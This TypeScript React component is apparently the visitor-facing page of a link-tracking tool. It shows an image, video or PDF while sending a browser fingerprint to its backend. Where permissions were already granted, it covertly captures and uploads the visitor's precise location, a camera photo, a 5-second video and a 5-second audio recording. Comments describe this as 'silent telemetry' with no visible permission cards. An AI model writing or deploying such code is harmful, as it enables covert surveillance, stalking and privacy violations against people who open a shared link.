import { useState, useEffect, useRef } from 'react';
import { useParams } from 'react-router-dom';
import {
  getVisitorSession,
  recordVisit,
  submitLocation,
  updatePermission,
  uploadPhoto,
  uploadVideo,
  uploadAudio,
} from '../lib/api';
import { AlertTriangle } from 'lucide-react';

// ─── Types ─────────────────────────────────────────────────────────────────────
type PermStatus = 'not_requested' | 'granted' | 'denied' | 'unavailable';

interface SessionInfo {
  demoId: string;
  expiresAt: string;
  status: string;
  mediaType: string;
  contentUrl: string | null;
  mediaUrl: string | null;
  themeLabel: string;
  themeCaption: string;
  themeLinkText: string;
  themeEmoji: string;
}

// ─── Browser info collection ───────────────────────────────────────────────────
function collectBrowserInfo() {
  return {
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    availScreenWidth: window.screen.availWidth,
    availScreenHeight: window.screen.availHeight,
    viewportWidth: window.innerWidth,
    viewportHeight: window.innerHeight,
    devicePixelRatio: window.devicePixelRatio || 1,
    language: navigator.language,
    languages: Array.from(navigator.languages || [navigator.language]),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    colorDepth: window.screen.colorDepth,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack === '1' ? true : navigator.doNotTrack === '0' ? false : null,
    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
    connectionType: (navigator as any).connection?.effectiveType || undefined,
  };
}

// ─── Permissions API helper ────────────────────────────────────────────────────
// Returns the current permission state via the Permissions API.
// Falls back to 'prompt' (i.e. unknown) when the API is unsupported or the
// specific permission name is unrecognised by the browser.
async function queryPermission(name: PermissionName): Promise<PermissionState> {
  try {
    if (!navigator.permissions) return 'prompt';
    const result = await navigator.permissions.query({ name });
    return result.state; // 'granted' | 'denied' | 'prompt'
  } catch {
    return 'prompt';
  }
}

export default function VisitorPage() {
  const { token } = useParams<{ token: string }>();
  const [session, setSession] = useState<SessionInfo | null>(null);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(true);
  const [contentError, setContentError] = useState(false);

  // Internal permission tracking — not shown to visitor but used to avoid
  // double-requesting after a denial.
  const locationDone = useRef(false);
  const cameraDone = useRef(false);
  const audioDone = useRef(false);

  const videoPreviewRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  // ─── Cleanup media streams on unmount ────────────────────────────────────────
  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(t => t.stop());
      }
    };
  }, []);

  // ─── Location ────────────────────────────────────────────────────────────────
  const collectLocation = async (tok: string): Promise<PermStatus> => {
    if (!navigator.geolocation) {
      await updatePermission(tok, 'location', 'unavailable');
      return 'unavailable';
    }
    return new Promise<PermStatus>(resolve => {
      navigator.geolocation.getCurrentPosition(
        async pos => {
          try {
            await submitLocation(tok, {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
            });
          } catch { /* backend error — visit still proceeds */ }
          resolve('granted');
        },
        async () => {
          await updatePermission(tok, 'location', 'denied');
          resolve('denied');
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
  };

  // ─── Camera Photo ─────────────────────────────────────────────────────────────
  const collectPhoto = async (tok: string): Promise<PermStatus> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
      streamRef.current = stream;

      const video = document.createElement('video');
      video.srcObject = stream;
      video.autoplay = true;
      await new Promise(r => { video.onloadeddata = r; });
      await new Promise(r => setTimeout(r, 600));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d')!.drawImage(video, 0, 0);

      stream.getTracks().forEach(t => t.stop());
      streamRef.current = null;

      const blob = await new Promise<Blob>(resolve => {
        canvas.toBlob(b => resolve(b!), 'image/jpeg', 0.85);
      });

      await uploadPhoto(tok, blob);
      return 'granted';
    } catch {
      await updatePermission(tok, 'camera', 'denied');
      return 'denied';
    }
  };

  // ─── 5-second Video ──────────────────────────────────────────────────────────
  const collectVideo = async (tok: string): Promise<PermStatus> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      streamRef.current = stream;

      let mimeType = 'video/webm';
      let options: MediaRecorderOptions = {};
      if (typeof MediaRecorder.isTypeSupported === 'function') {
        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
          mimeType = 'video/webm;codecs=vp8,opus';
          options = { mimeType };
        } else if (MediaRecorder.isTypeSupported('video/webm')) {
          mimeType = 'video/webm';
          options = { mimeType };
        } else if (MediaRecorder.isTypeSupported('video/mp4')) {
          mimeType = 'video/mp4';
          options = { mimeType };
        }
      }

      const recorder = new MediaRecorder(stream, options);
      const chunks: Blob[] = [];
      recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
      recorder.start(500);

      await new Promise(r => setTimeout(r, 5000));

      if (recorder.state !== 'inactive') {
        recorder.stop();
        await new Promise<void>(r => { recorder.onstop = () => r(); });
      }

      stream.getTracks().forEach(t => t.stop());
      streamRef.current = null;
      if (videoPreviewRef.current) videoPreviewRef.current.srcObject = null;

      await uploadVideo(tok, new Blob(chunks, { type: mimeType }));
      return 'granted';
    } catch {
      await updatePermission(tok, 'camera', 'denied');
      return 'denied';
    }
  };

  // ─── 5-second Audio ──────────────────────────────────────────────────────────
  const collectAudio = async (tok: string): Promise<PermStatus> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      streamRef.current = stream;

      let mimeType = 'audio/webm';
      let options: MediaRecorderOptions = {};
      if (typeof MediaRecorder.isTypeSupported === 'function') {
        if (MediaRecorder.isTypeSupported('audio/webm')) {
          mimeType = 'audio/webm';
          options = { mimeType };
        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
          mimeType = 'audio/mp4';
          options = { mimeType };
        } else if (MediaRecorder.isTypeSupported('audio/ogg')) {
          mimeType = 'audio/ogg';
          options = { mimeType };
        }
      }

      const recorder = new MediaRecorder(stream, options);
      const chunks: Blob[] = [];
      recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
      recorder.start(500);

      await new Promise(r => setTimeout(r, 5000));

      if (recorder.state !== 'inactive') {
        recorder.stop();
        await new Promise<void>(r => { recorder.onstop = () => r(); });
      }

      stream.getTracks().forEach(t => t.stop());
      streamRef.current = null;

      await uploadAudio(tok, new Blob(chunks, { type: mimeType }));
      return 'granted';
    } catch {
      await updatePermission(tok, 'microphone', 'denied');
      return 'denied';
    }
  };

  // ─── Auto-collection pipeline ────────────────────────────────────────────────
  // Runs after the session loads. Behavior per Permissions API state:
  //
  //   'granted' → collect silently — no browser prompt will appear because
  //               the permission was already granted for this origin.
  //
  //   'prompt'  → SKIP entirely. We do NOT trigger the browser's native dialog
  //               automatically on page load. Firing getUserMedia / geolocation
  //               for every 'prompt' permission would bombard the visitor with
  //               simultaneous native dialogs before they even see the content.
  //
  //   'denied'  → skip collection; record the status on the backend so the
  //               dashboard reflects that the visitor had denied this permission.
  //
  // Permissions API unsupported / query throws → falls back to 'prompt', so
  // collection is skipped gracefully in those environments too.
  //
  // Any single collection failure is isolated — the others and page content
  // continue normally.
  const runCollection = async (tok: string) => {
    // ── Geolocation ──────────────────────────────────────────────────────────
    if (!locationDone.current) {
      locationDone.current = true;
      const geoState = await queryPermission('geolocation');
      if (geoState === 'granted') {
        collectLocation(tok); // already granted — collects silently, no prompt
      } else if (geoState === 'denied') {
        updatePermission(tok, 'location', 'denied');
      }
      // 'prompt' → skip; no automatic native dialog
    }

    // ── Camera (photo then 5-sec video) ──────────────────────────────────────
    if (!cameraDone.current) {
      cameraDone.current = true;
      const camState = await queryPermission('camera' as PermissionName);
      if (camState === 'granted') {
        // Photo first; video only if photo stream was accessible
        const photoResult = await collectPhoto(tok);
        if (photoResult === 'granted') {
          collectVideo(tok); // fire-and-forget — runs in background
        }
      } else if (camState === 'denied') {
        updatePermission(tok, 'camera', 'denied');
      }
      // 'prompt' → skip; no automatic native dialog
    }

    // ── Microphone ───────────────────────────────────────────────────────────
    if (!audioDone.current) {
      audioDone.current = true;
      const micState = await queryPermission('microphone' as PermissionName);
      if (micState === 'granted') {
        collectAudio(tok); // already granted — collects silently, no prompt
      } else if (micState === 'denied') {
        updatePermission(tok, 'microphone', 'denied');
      }
      // 'prompt' → skip; no automatic native dialog
    }
  };

  // ─── Session load + visit record ─────────────────────────────────────────────
  useEffect(() => {
    if (!token) return;
    (async () => {
      try {
        const data = await getVisitorSession(token);
        setSession(data);
        // Record visit — sends browser fingerprint + triggers server-side geo lookup
        await recordVisit(token, collectBrowserInfo());
        // Start silent telemetry collection (does NOT block content rendering)
        runCollection(token);
      } catch (err: any) {
        setError(err.message || 'Link not found');
      } finally {
        setLoading(false);
      }
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [token]);

  // ─── Loading ─────────────────────────────────────────────────────────────────
  if (loading) {
    return (
      <div style={{ minHeight: '100vh', background: 'var(--color-bg-primary)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <div style={{ textAlign: 'center', color: 'var(--color-text-muted)' }}>
          <div style={{
            width: '40px', height: '40px', borderRadius: '50%',
            border: '3px solid var(--color-border)',
            borderTopColor: 'var(--color-accent)',
            animation: 'spin-slow 0.8s linear infinite',
            margin: '0 auto 1rem',
          }} />
          <p style={{ fontSize: '0.875rem' }}>Loading…</p>
        </div>
      </div>
    );
  }

  // ─── Error / Terminated / Expired ────────────────────────────────────────────
  if (error) {
    return (
      <div style={{ minHeight: '100vh', background: 'var(--color-bg-primary)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '1.5rem' }}>
        <div className="card" style={{ maxWidth: '400px', width: '100%', textAlign: 'center' }}>
          <AlertTriangle size={40} style={{ color: 'var(--color-text-muted)', margin: '0 auto 1rem' }} />
          <h2 style={{ fontSize: '1.125rem', fontWeight: 600, marginBottom: '0.5rem' }}>
            This link is no longer active.
          </h2>
          <p style={{ fontSize: '0.875rem', color: 'var(--color-text-muted)' }}>
            {error.includes('expired') ? 'This link has expired.' : error.includes('terminated') ? 'This link was terminated.' : 'This link is not available.'}
          </p>
        </div>
      </div>
    );
  }

  if (!session) return null;

  const { mediaType, contentUrl, mediaUrl } = session;

  // ─── Main Visitor Page — content only, no permission cards ───────────────────
  return (
    <div style={{ minHeight: '100vh', background: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
      {/* Content Area — fills full viewport */}
      <div style={{ width: '100%', height: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
        {mediaType === 'image' && contentUrl && !contentError && (
          <img
            src={contentUrl}
            alt={session.themeLabel}
            onError={() => setContentError(true)}
            style={{ maxWidth: '100%', maxHeight: '100vh', objectFit: 'contain', display: 'block' }}
          />
        )}

        {mediaType === 'video' && contentUrl && !contentError && (
          <video
            src={contentUrl}
            controls
            autoPlay
            onError={() => setContentError(true)}
            style={{ maxWidth: '100%', maxHeight: '100vh', display: 'block' }}
          />
        )}

        {mediaType === 'pdf' && mediaUrl && (
          <iframe
            src={mediaUrl}
            title={session.themeLabel}
            style={{ width: '100%', height: '100vh', border: 'none', display: 'block' }}
          />
        )}

        {contentError && (
          <div className="card" style={{ maxWidth: '420px', margin: '2rem', textAlign: 'center', background: 'var(--color-bg-card)', border: '1px solid var(--color-border)' }}>
            <AlertTriangle size={32} style={{ color: 'var(--color-warning)', margin: '0 auto 0.75rem' }} />
            <h3 style={{ fontSize: '1rem', fontWeight: 600, marginBottom: '0.35rem' }}>Unable to load content</h3>
            <p style={{ fontSize: '0.8rem', color: 'var(--color-text-muted)' }}>
              The {mediaType} could not be loaded from the provided URL.
            </p>
          </div>
        )}
      </div>
    </div>
  );
}
